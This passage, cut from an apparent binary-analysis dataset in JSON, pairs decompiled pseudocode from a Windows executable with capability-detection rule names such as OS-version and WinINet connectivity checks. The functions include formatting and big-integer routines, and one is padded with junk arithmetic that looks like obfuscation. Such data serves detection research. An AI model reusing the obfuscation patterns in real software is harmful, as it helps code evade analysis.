= puStack304 + 2;\n                        }\n                        else {\n                            puStack300 = puStack300 + 1;\n                            uStack296 = *puStack300;\n                            uStack292 = uStack296 >> 0x1f;\n                            puStack304 = puStack304 + 1;\n                        }\n                    }\n                    else {\n                        uStack296 = uStack296 & 0xffff0000;\n                    }\n                }\n                uVar3 = fcn.0041027f(acStack264, uStack296, uStack292);\n                iStack312 = iStack312 + uVar3;\n                uVar1 = uStack280 & 1;\n                if ((uVar1 == 0) && (uStack272 < uStack276)) {\n                    iVar2 = uStack276 - uStack272;\n                    iStack312 = iStack312 + iVar2;\n                    do {\n                        if (puVar5 != NULL) {\n                            *puVar5 = 0x20;\n                            puVar5 = puVar5 + 1;\n                        }\n                        iVar2 = iVar2 + -1;\n                        puStack308 = puVar5;\n                    } while (iVar2 != 0);\n                }\n                uVar4 = 0;\n                iVar2 = iStack312;\n    // switch table (9 cases) at 0x410e4c\n                switch(uStack284) {\n                case 0:\n                    goto code_r0x00410d86;\n                case 1:\n                case 2:\n                    if (puVar5 != NULL) {\n                        *puVar5 = uStack296;\n                        puVar5 = puVar5 + 1;\n                        puStack308 = puVar5;\n                    }\n                    break;\n                case 3:\n                    if ((puVar5 != NULL) && (uVar4 = 0,  uVar3 != 0)) {\n                        do {\n                            *puVar5 = *(uVar4 + uStack296);\n                            puVar5 = puVar5 + 1;\n                            uVar4 = uVar4 + 1;\n                            puStack308 = puVar5;\n                        } while (uVar4 < uVar3);\n                    }\n                    break;\n                case 4:\n                    if ((puVar5 != NULL) && (uVar4 = 0,  puVar5 = puStack308,  uVar3 != 0)) {\n                        do {\n                            uStack268 = *(uStack296 + uVar4 * 2);\n                            uStack266 = 0;\n                            fcn.0040d509(&uStack268, 1, puStack308);\n                            puVar5 = puStack308 + 1;\n                            uVar4 = uVar4 + 1;\n                            puStack308 = puVar5;\n                        } while (uVar4 < uVar3);\n                    }\n                    break;\n                case 7:\n                case 8:\n                    if (((uStack280 & 2) != 0) && (((uStack296 | uStack292) != 0 || ((uStack280 & 0x1000) != 0)))) {\n                        if (puVar5 != NULL) {\n                            *puVar5 = 0x30;\n                            puVar5 = puVar5 + 1;\n                            puStack308 = puVar5;\n                        }\n                        iVar2 = iStack312 + 1;\n                        if (uStack284 == 7) {\n                            if (puVar5 != NULL) {\n                                *puVar5 = ~uStack280 & 0x20 | 0x58;\n                                puVar5 = puVar5 + 1;\n                                puStack308 = puVar5;\n                            }\n                            iVar2 = iStack312 + 2;\n                        }\n                    }\n                case 5:\n                    iStack312 = iVar2;\n                    if ((puVar5 != NULL) && (acStack264[0] == '-')) {\n                        *puVar5 = 0x2d;\n                        puVar5 = puVar5 + 1;\n                        uVar4 = 1;\n                        puStack308 = puVar5;\n                    }\n                case 6:\n                    if (uVar3 < uStack272) {\n                        iVar2 = uStack272 - uVar3;\n                        iStack312 = iStack312 + iVar2;\n                        do {\n                            if (puVar5 != NULL) {\n                                *puVar5 = 0x30;\n                                puVar5 = puVar5 + 1;\n                            }\n                            iVar2 = iVar2 + -1;\n                            puStack308 = puVar5;\n                        } while (iVar2 != 0);\n                    }\n                    if ((puVar5 != NULL) && (uVar4 < uVar3)) {\n                        sub.ntdll.dll_memcpy(puVar5, acStack264 + uVar4, uVar3 - uVar4);\n                        puVar5 = puVar5 + (uVar3 - uVar4);\n                        puStack308 = puVar5;\n                    }\n                }\n                if ((uVar1 != 0) && (uStack272 < uStack276)) {\n                    iVar2 = uStack276 - uStack272;\n                    iStack312 = iStack312 + iVar2;\n                    do {\n                        if (puVar5 != NULL) {\n                            *puVar5 = 0x20;\n                            puVar5 = puVar5 + 1;\n                        }\n                        iVar2 = iVar2 + -1;\n                        puStack308 = puVar5;\n                    } while (iVar2 != 0);\n                }\n            }\n            else {\n                if (puVar5 != NULL) {\n                    *puVar5 = *arg_ch;\ncode_r0x00410ba7:\n                    puVar5 = puVar5 + 1;\n                    puStack308 = puVar5;\n                }\ncode_r0x00410bac:\n                arg_ch = arg_ch + 1;\n                iStack312 = iStack312 + 1;\n            }\ncode_r0x00410d86:\n        } while (*arg_ch != 0);\n        if ((iStack312 != 0) && (arg_8h != NULL)) {\n            arg_8h[iStack312] = 0;\n        }\n    }\n    return iStack312;\n}\n",
        "token_count": 1962
    },
    "004112e1": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.004112e1(int32_t param_1, int32_t param_2)\n\n{\n    uint arg_ch;\n    uint arg_8h;\n    uint *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    arg_ch = in_EAX[1];\n    arg_8h = *in_EAX;\n    iVar1 = fcn.004137b1();\n    uVar2 = iVar1 + 7U >> 3;\n    if (uVar2 == 0) {\n        uVar2 = 1;\n    }\n    if ((param_1 != 0) && (param_2 != 0)) {\n        uVar2 = fcn.00413be2(arg_8h, arg_ch, param_1, param_2);\n    }\n    return uVar2;\n}\n",
        "token_count": 187
    },
    "00411414": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00411414(uint *param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = param_1[1];\n    if ((iVar2 == 0) || (param_2 == 0)) {\n        fcn.00411219(0);\n    }\n    else {\n        fcn.00411219(iVar2 + 1);\n        iVar1 = fcn.00413a4f(*param_1, param_2);\n        if (iVar1 == 0) {\n            iVar2 = fcn.0041379d(*in_EAX);\n            in_EAX[1] = iVar2;\n        }\n        else {\n            *(*in_EAX + iVar2 * 4) = iVar1;\n            in_EAX[1] = iVar2 + 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 207
    },
    "004122c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004122c4(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    uint *puVar3;\n    uint *unaff_ESI;\n    int32_t iVar4;\n    uint uVar5;\n    uint s;\n    uint var_4h;\n    \n    if (unaff_ESI == NULL) {\n        iVar4 = 3;\n    }\n    else if (unaff_ESI[0x43] == 0) {\n        iVar4 = 5;\n    }\n    else if (in_EAX < 0) {\n        iVar4 = 6;\n    }\n    else if (in_EAX < 0x1c) {\n        puVar1 = unaff_ESI + 0x46;\n        uVar2 = *puVar1;\n        *puVar1 = *puVar1 + 1;\n        unaff_ESI[0x47] = unaff_ESI[0x47] + (0xfffffffe < uVar2);\n        if (in_EAX == 1) {\n            if (unaff_ESI[0x5b] + 1 < 2) {\n                uVar5 = 0x30;\n                puVar3 = unaff_ESI + 0xfe;\n            }\n            else {\n                uVar5 = 0x40;\n                puVar3 = unaff_ESI + 0xde;\n            }\n            fcn.0041208a(puVar3, uVar5);\n        }\n        puVar1 = unaff_ESI + in_EAX * 2 + 0xefc;\n        iVar4 = fcn.00415150(arg_8h, unaff_ESI + 0x4a, in_EAX, *puVar1, arg_ch, 0x1000 - unaff_ESI[in_EAX + 0xede], \n                             unaff_ESI[0x5a], *unaff_ESI, unaff_ESI + in_EAX * 0x80 + 0x5e);\n        if (iVar4 == 0) {\n            unaff_ESI[in_EAX + 0xede] = 0;\n            uVar2 = *puVar1;\n            *puVar1 = *puVar1 + 1;\n            puVar1[1] = puVar1[1] + (0xfffffffe < uVar2);\n            sub.ntdll.dll_memset(unaff_ESI + in_EAX * 0x80 + 0x5e, 0, 0x200);\n            iVar4 = 0;\n        }\n    }\n    else {\n        iVar4 = 7;\n    }\n    return iVar4;\n}\n",
        "token_count": 604
    },
    "004123ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004123ac(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint var_84h;\n    \n    iVar4 = arg_8h;\n    if (arg_8h == 0) {\n        return 3;\n    }\n    if (*(arg_8h + 0x10c) == 0) {\n        return 5;\n    }\n    if (arg_10h == 0) {\n        if (*(arg_8h + 0x3b78 + arg_ch * 4) < 0x1000) {\n            return 0;\n        }\n    }\n    else if (arg_ch == *(arg_8h + 0x174)) {\n        if (arg_ch == *(arg_8h + 0x16c) + 1) {\n            if (*(arg_8h + 0x3b78 + arg_ch * 4) == 0x400) {\n                if (*(arg_8h + 0x3bf4 + arg_ch * 8) != 0) {\n                    return 0;\n                }\n                if (*(arg_8h + 0x3bf0 + arg_ch * 8) != 0) {\n                    return 0;\n                }\n            }\n        }\n        else if ((1 < arg_ch) && (*(arg_8h + 0x3b78 + arg_ch * 4) == 0x400)) {\n            return 0;\n        }\n    }\n    arg_8h = 0;\n    if ((arg_10h != 0) && (arg_ch == *(iVar4 + 0x174))) {\n        arg_8h = 1;\n    }\n    iVar3 = fcn.004122c4(&var_84h, arg_8h);\n    if (iVar3 == 0) {\n        if (arg_8h == 1) {\n            puVar6 = &var_84h;\n            puVar7 = iVar4 + 8;\n            for (iVar3 = 0x20; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar7 = *puVar6;\n                puVar6 = puVar6 + 1;\n                puVar7 = puVar7 + 1;\n            }\n            return 0;\n        }\n        iVar5 = *(iVar4 + 0x16c) + 1;\n        iVar3 = arg_ch + 1;\n        if (((iVar5 <= arg_ch + 1) &&\n            (iVar3 = iVar5,  (*(iVar4 + 0x3bf0 + iVar5 * 8) | *(iVar4 + 0x3bf4 + iVar5 * 8)) == 0)) &&\n           (piVar1 = iVar4 + 0x3b78 + iVar5 * 4,  *piVar1 == 0)) {\n            *piVar1 = 0x400;\n        }\n        puVar2 = iVar4 + 0x3b78 + iVar3 * 4;\n        puVar6 = &var_84h;\n        puVar7 = iVar3 * 0x200 + 0x178 + (*puVar2 >> 3) + iVar4;\n        for (iVar5 = 0x20; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar7 = *puVar6;\n            puVar6 = puVar6 + 1;\n            puVar7 = puVar7 + 1;\n        }\n        *puVar2 = *puVar2 + 0x400;\n        if (*(iVar4 + 0x174) < iVar3) {\n            *(iVar4 + 0x174) = iVar3;\n        }\n        iVar4 = fcn.004123ac(iVar4, iVar3, arg_10h);\n        return iVar4;\n    }\n    return iVar3;\n}\n",
        "token_count": 912
    },
    "0041278e": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0041278e(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (in_EAX == NULL) {\n        iVar2 = 3;\n    }\n    else if (in_EAX[0x43] == 0) {\n        iVar2 = 5;\n    }\n    else {\n        if (in_EAX[0x48] != 1) {\n            iVar2 = 1;\n            if ((in_EAX[0x5d] != 1) && (iVar2 = 1,  0 < in_EAX[0x5d])) {\n                piVar1 = in_EAX + 0xedf;\n                iVar2 = 1;\n                do {\n                    if (*piVar1 != 0) break;\n                    iVar2 = iVar2 + 1;\n                    piVar1 = piVar1 + 1;\n                } while (iVar2 <= in_EAX[0x5d]);\n            }\n            iVar2 = fcn.004123ac(in_EAX, iVar2, 1);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            fcn.0041208a(in_EAX + 2, 0x10);\n            fcn.004126c9();\n            if (param_1 != 0) {\n                sub.ntdll.dll_memcpy(param_1, in_EAX + 2, *in_EAX + 7 + (*in_EAX + 7 >> 0x1f & 7U) >> 3);\n            }\n            fcn.00412626();\n            in_EAX[0x48] = 1;\n        }\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 394
    },
    "00412b1e": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00412fee)\n// WARNING: Removing unreachable block (ram,0x00413031)\n// WARNING: Removing unreachable block (ram,0x00413033)\n// WARNING: Removing unreachable block (ram,0x00413038)\n// WARNING: Removing unreachable block (ram,0x00413042)\n// WARNING: Removing unreachable block (ram,0x00413062)\n// WARNING: Removing unreachable block (ram,0x0041307c)\n// WARNING: Removing unreachable block (ram,0x0041307e)\n// WARNING: Removing unreachable block (ram,0x00413083)\n// WARNING: Removing unreachable block (ram,0x0041308f)\n// WARNING: Removing unreachable block (ram,0x004130ae)\n// WARNING: Removing unreachable block (ram,0x004130b0)\n// WARNING: Removing unreachable block (ram,0x004130b4)\n// WARNING: Removing unreachable block (ram,0x00413048)\n// WARNING: Removing unreachable block (ram,0x00412d55)\n// WARNING: Removing unreachable block (ram,0x00412d69)\n// WARNING: Removing unreachable block (ram,0x00412d6f)\n// WARNING: Removing unreachable block (ram,0x00412d79)\n// WARNING: Removing unreachable block (ram,0x00412d9e)\n// WARNING: Removing unreachable block (ram,0x00412da6)\n// WARNING: Removing unreachable block (ram,0x00412dab)\n// WARNING: Removing unreachable block (ram,0x00412db6)\n// WARNING: Removing unreachable block (ram,0x00412db9)\n// WARNING: Removing unreachable block (ram,0x004131c1)\n// WARNING: Removing unreachable block (ram,0x00412bd4)\n// WARNING: Removing unreachable block (ram,0x00412cd5)\n// WARNING: Removing unreachable block (ram,0x00412ed5)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00412b1e(uint32_t *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint arg_8h_00;\n    char cVar4;\n    uint8_t uVar5;\n    int16_t iVar6;\n    uint16_t uVar7;\n    uint32_t arg_ch_00;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint *in_ECX;\n    int32_t iVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    char extraout_var;\n    uint16_t uVar15;\n    uint32_t uVar16;\n    int64_t iVar17;\n    int64_t iVar18;\n    ulong uVar19;\n    uint32_t uVar20;\n    uint arg_ch_01;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_5h;\n    \n    arg_8h_00 = *0x41b03c;\n    uVar5 = var_5h << (*0x41b038 & 0x1f);\n    *0x41b038 = *0x41b038 >> 0xf;\n    uVar10 = *0x41b038 & 0xffff0000;\n    *0x41b038 = uVar10 | *0x41b038;\n    if ((arg_10h & 0x80000000) == 0) {\n        *arg_ch = 0;\n        *arg_8h = 0;\n        return -1;\n    }\n    arg_ch_00 = arg_10h >> 0x10;\n    uVar1 = *in_ECX;\n    uVar15 = (uVar5 ^ *0x41b038) * (uVar5 | 0x75);\n    uVar3 = *in_ECX;\n    uVar8 = *(in_ECX + 2);\n    *0x41b038 = uVar10 | uVar15;\n    iVar6 = fcn.0041286e(*0x41b03c);\n    uVar15 = uVar15 + iVar6 * 0x50;\n    uVar10 = in_ECX[1];\n    uVar7 = *(in_ECX + 6);\n    var_5h._0_1_ = uVar5 + uVar15;\n    *0x41b038 = *0x41b038 & 0xffff0000 | uVar15;\n    iVar17 = fcn.0041286e(arg_8h_00);\n    if (((iVar17 < var_5h) && (uVar15 < var_5h * 8)) && (uVar15 < 0xe6)) {\n        uVar15 = 0;\n        *0x41b038 = *0x41b038 & 0xffff0000;\n    }\n    uVar20 = *0x41b038;\n    iVar2 = -(uVar7 < arg_ch_00);\n    var_ch = iVar2 + 1;\n    if (var_ch != 0) {\n        uVar15 = 0;\n        *0x41b038 = *0x41b038 & 0xffff0000;\n        if (((uVar7 - arg_ch_00) * 0x10000 | uVar10 & 0xffff) < (arg_10h & 0xffff)) {\n            uVar15 = 0xe6;\n            *0x41b03a = SUB42(uVar20, 2);\n            *0x41b038 = CONCAT22(*0x41b03a, 0xe6);\n            var_ch = iVar2;\n        }\n    }\n    iVar2 = var_ch;\n    iVar17 = fcn.0041286e(arg_8h_00);\n    iVar9 = iVar17 >> 0x20;\n    uVar20 = iVar17;\n    uVar16 = uVar15;\n    iVar13 = uVar16 >> 0x1f;\n    if (((iVar13 < iVar9) || ((iVar13 <= iVar9 && (uVar16 < (uVar20 | 0x5f))))) || (uVar16 * 0x65 < 0x6a)) {\n        iVar11 = iVar9 - (uVar20 < 0x83);\n        if (((iVar13 < iVar11) || ((iVar13 <= iVar11 && (uVar16 < uVar20 - 0x83)))) ||\n           ((0x4195 < uVar15 && (var_5h <= uVar15)))) {\n            var_5h._0_1_ = *0x41b038 | 0x32;\n        }\n        else {\n            cVar4 = fcn.0041286e(0x201f5b6);\n            var_5h._0_1_ = var_5h << (cVar4 * -0x4b & 0x1fU);\n        }\n    }\n    iVar18 = sub.ntdll.dll__allmul(iVar17, 9, 0);\n    if (((iVar18 < uVar16 - 0xcd) && (iVar17 != CONCAT44(iVar9 - (uVar20 < 0xad), uVar20 - 0xad))) ||\n       (iVar17 = fcn.0041286e(0x15b975d),  iVar17 == uVar16 << 0xb)) {\n        var_5h._0_1_ = var_5h >> (*0x41b040 & 0x1f);\n    }\n    if (var_ch == 0) goto code_r0x00412e7e;\n    uVar7 = fcn.00412858();\n    *0x41b038 = *0x41b038 ^ uVar7;\n    *0x41b038 = *0x41b038 & 0xffff0000 | *0x41b038;\n    fcn.00412a32(var_ch, arg_ch_00, arg_10h & 0xffff);\n    iVar9 = fcn.00412858();\n    if (-1 < iVar9) goto code_r0x00412e7e;\n    if (((*0x41b038 < var_5h * 0x13) && (*0x41b038 < 0)) && (iVar9 = fcn.00412858(),  iVar9 == 0)) {\n        if (*0x41b038 == 0) {\n            iVar17 = fcn.0041286e(arg_8h_00);\n            iVar9 = fcn.00412858();\n            if (iVar17 == iVar9) {\n                uVar19 = fcn.0041286e(arg_8h_00);\n                if (((uVar19 ^ 0x1e) == (uVar19 & 0x54)) && (uVar19 >> 0x20 == 0)) goto code_r0x00412e7e;\n                iVar9 = fcn.004128b1(0x7d, *0x41e54c);\n                if (*0x41b038 == iVar9) goto code_r0x00412e7e;\n                uVar20 = 0x34;\n                arg_ch_01 = 1;\n                goto code_r0x00412e77;\n            }\n        }\n        uVar20 = *0x41b0dc;\n        arg_ch_01 = *0x41e5a8;\n    }\n    else {\n        arg_ch_01 = 0;\n        uVar20 = 0x76;\n    }\ncode_r0x00412e77:\n    fcn.004128b1(uVar20, arg_ch_01);\ncode_r0x00412e7e:\n    *0x41b038 = *0x41b038 + 0xe6;\n    *0x41b038 = *0x41b038 & 0xffff0000 | *0x41b038;\n    uVar20 = uVar10 / arg_ch_00;\n    if (-1 < *0x41b038) {\n        uVar19 = fcn.0041286e(0x14c8081);\n        iVar17 = sub.ntdll.dll__allmul(uVar19, 0x2f, 0);\n        iVar18 = fcn.0041286e(0x6556b3);\n        if (iVar17 < iVar18) {\n            iVar9 = 3;\n            do {\n                iVar6 = fcn.0041286e(0x11d541);\n                iVar9 = iVar9 + -1;\n                *0x41b038 = *0x41b038 & 0xffff0000 | iVar6 * *0x41b038;\n            } while (iVar9 != 0);\n        }\n    }\n    iVar9 = uVar10 - uVar20 * arg_ch_00;\n    fcn.0041286e(0x18286c);\n    var_5h._0_1_ = 0;\n    if ((uVar20 == 0x10000) ||\n       (uVar14 = uVar20 * (arg_10h & 0xffff),  uVar12 = iVar9 * 0x10000 | uVar8,  uVar16 = uVar20, \n       uVar12 <= uVar14 && uVar14 - uVar12 != 0)) {\n        if (*0x41b038 == 0xe6) {\n            *0x41b038 = CONCAT22(*0x41b03a, 0xe7);\n        }\n        uVar12 = iVar9 + arg_ch_00;\n        uVar16 = uVar20 - 1;\n        fcn.0041286e(0x254df30);\n        if ((uVar12 < 0x10000) &&\n           (uVar14 = uVar16 * (arg_10h & 0xffff),  uVar12 = uVar12 * 0x10000 | uVar8, \n           uVar12 <= uVar14 && uVar14 - uVar12 != 0)) {\n            *0x41b038 = *0x41b038 & 0xffff0000;\n            uVar16 = uVar20 - 2;\n            uVar7 = fcn.0041286e(arg_8h_00);\n            *0x41b038 = *0x41b038 & 0xffff0000 | uVar7;\n        }\n        uVar5 = fcn.0041286e(0x80ae42);\n        var_5h._0_1_ = extraout_var >> 7 | uVar5;\n    }\n    uVar8 = uVar10 << 0x10 | uVar8;\n    *0x41b038 = *0x41b038 - 0xde;\n    *0x41b038 = *0x41b038 & 0xffff0000 | *0x41b038;\n    fcn.00412a32(uVar16, arg_ch_00, arg_10h & 0xffff);\n    *arg_8h = uVar16 << 0x10;\n    uVar10 = uVar8 / arg_ch_00;\n    iVar9 = uVar8 - uVar10 * arg_ch_00;\n    cVar4 = fcn.0041286e(0x8eaf32);\n    *0x41b038 = *0x41b038 >> (cVar4 + var_5h & 0x1f);\n    *0x41b038 = *0x41b038 & 0xffff0000 | *0x41b038;\n    if ((uVar10 == 0x10000) ||\n       (uVar20 = uVar10 * (arg_10h & 0xffff),  uVar8 = iVar9 * 0x10000 | uVar1,  var_ch = uVar10, \n       uVar8 <= uVar20 && uVar20 - uVar8 != 0)) {\n        var_ch = uVar10 - 1;\n        iVar13 = *0x41b038;\n        uVar19 = fcn.0041286e(0x1a441b5);\n        if ((uVar19 - 0x28 == iVar13) &&\n           ((((uVar19 >> 0x20) - (uVar19 < 0x28) == iVar13 >> 0x1f &&\n             (iVar17 = fcn.0041286e(0x274ed2f),  iVar17 == iVar13)) && (0x92 < *0x41b038)))) {\n            iVar6 = 4;\n            do {\n                iVar6 = iVar6 + -1;\n            } while (0 < iVar6);\n        }\n        uVar8 = iVar9 + arg_ch_00;\n        *0x41b038 = *0x41b038 & 0xffff0000 | *0x41b038 << (arg_10h._3_1_ + 7U & 0x1f);\n        if ((uVar8 < 0x10000) &&\n           (uVar20 = var_ch * (arg_10h & 0xffff),  uVar8 = uVar8 * 0x10000 | uVar1, \n           uVar8 <= uVar20 && uVar20 - uVar8 != 0)) {\n            var_ch = uVar10 - 2;\n        }\n    }\n    fcn.00412a32(var_ch, arg_ch_00, arg_10h & 0xffff);\n    *arg_8h = *arg_8h | var_ch & 0xffff;\n    *arg_ch = uVar3;\n    return iVar2;\n}\n",
        "token_count": 3555
    },
    "00413339": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00413339(int32_t arg_8h, uint *arg_ch, uint arg_10h, uint arg_14h, uint *arg_18h, uint arg_1ch)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *arg_14h_00;\n    uint uVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    uint32_t *puVar8;\n    ulong uVar9;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint *var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    int32_t *var_14h;\n    uint32_t *var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    fcn.004137fb();\n    fcn.004137fb();\n    arg_14h_00 = fcn.0041379d(arg_18h);\n    uVar9 = fcn.0041379d(arg_10h);\n    puVar6 = uVar9 >> 0x20;\n    iVar7 = uVar9 - arg_14h_00;\n    if (arg_14h_00 == NULL) {\n        return 0xffffffff;\n    }\n    if (arg_14h_00 == 0x1) {\n        uVar4 = fcn.00413aab(arg_10h, *puVar6);\n        *arg_ch = uVar4;\n        return 0;\n    }\n    if (iVar7 < 0) {\ncode_r0x004133aa:\n        fcn.004137e3(arg_10h);\n    }\n    else {\n        if (iVar7 == 0) {\n            iVar5 = fcn.0041374c(arg_10h);\n            if (iVar5 < 0) goto code_r0x004133aa;\n            puVar6 = arg_18h;\n            if (iVar5 == 0) {\n                fcn.00413817();\n                return 0;\n            }\n        }\n        var_ch = 0;\n        var_18h = 0x80000000;\n        do {\n            if ((var_18h & puVar6[arg_14h_00 + -1]) != 0) break;\n            var_18h = var_18h >> 1;\n            var_ch = var_ch + 1;\n        } while (var_ch < 0x20);\n        fcn.0041382f(puVar6, puVar6, var_ch, arg_14h_00);\n        var_28h = iVar7 + arg_14h_00;\n        iVar5 = fcn.0041382f(arg_ch, arg_10h, var_ch, var_28h);\n        var_10h = arg_ch + iVar7;\n        var_20h = arg_18h + (iVar7 * -4 - arg_ch);\n        var_2ch = arg_8h - arg_ch;\n        var_18h = iVar7;\n        var_14h = arg_ch + var_28h + -1;\n        do {\n            var_8h = 0;\n            var_34h = *var_14h;\n            var_30h = iVar5;\n            iVar7 = fcn.00412b1e(&var_4h, &var_1ch, arg_18h[arg_14h_00 + -1]);\n            if (iVar7 == 0) {\ncode_r0x0041349e:\n                iVar7 = var_30h;\n                if (var_4h != 0) {\n                    if (var_8h == 0) goto code_r0x004134aa;\n                    goto code_r0x004134fe;\n                }\n            }\n            else {\n                var_4h = -1;\n                var_1ch = *var_14h + arg_18h[arg_14h_00 + -1];\n                if (var_1ch < arg_18h[arg_14h_00 + -1]) {\n                    var_8h = 1;\n                    goto code_r0x0041349e;\n                }\ncode_r0x004134aa:\n                uVar2 = var_1ch;\n                var_24h = arg_ch + arg_14h_00 + var_18h + -2;\n                iVar7 = fcn.0041330b(var_4h, *var_24h);\n                if (iVar7 != 0) {\n                    var_4h = var_4h + -1;\n                    var_1ch = uVar2 + arg_18h[arg_14h_00 + -1];\n                    if ((arg_18h[arg_14h_00 + -1] <= var_1ch) && (iVar7 = fcn.0041330b(var_4h, *var_24h),  iVar7 != 0))\n                    {\n                        var_4h = var_4h + -1;\n                    }\n                }\ncode_r0x004134fe:\n                iVar7 = var_30h;\n                if (var_4h != 0) {\n                    var_8h = 0;\n                    puVar3 = arg_14h_00;\n                    puVar6 = var_24h;\n                    puVar8 = var_10h;\n                    while (var_24h = puVar3,  var_24h != NULL) {\n                        fcn.00412944(&var_3ch);\n                        *puVar8 = *puVar8 - var_8h;\n                        var_8h = -var_8h - 1 < *puVar8;\n                        *puVar8 = *puVar8 - var_3ch;\n                        if (-var_3ch - 1U <= *puVar8 && *puVar8 != -var_3ch - 1U) {\n                            var_8h = var_8h + 1;\n                        }\n                        var_8h = var_8h + var_38h;\n                        puVar8 = puVar8 + 1;\n                        puVar6 = var_24h + -1;\n                        puVar3 = puVar6;\n                    }\n                    iVar7 = var_30h - var_8h;\n                    var_24h = puVar6;\n                }\n            }\n            *(var_2ch + var_10h) = var_4h;\n            if (iVar7 != 0) {\n                *(var_2ch + var_10h) = var_4h + -1;\n                fcn.004131e0(arg_18h, arg_14h_00);\n            }\n            var_18h = var_18h + -1;\n            var_10h = var_10h + -1;\n            var_20h = var_20h + 4;\n            piVar1 = var_14h + -1;\n            iVar5 = *var_14h;\n            var_14h = piVar1;\n        } while (-1 < var_18h);\n        if (arg_14h_00 < var_28h) {\n            puVar6 = arg_ch + arg_14h_00;\n            for (iVar7 = var_28h - arg_14h_00; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n        }\n        fcn.004138f4(arg_ch, arg_ch, var_ch, arg_14h_00);\n        fcn.004138f4(arg_18h, arg_18h, var_ch, arg_14h_00);\n    }\n    return 0;\n}\n",
        "token_count": 1767
    },
    "004135d9": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
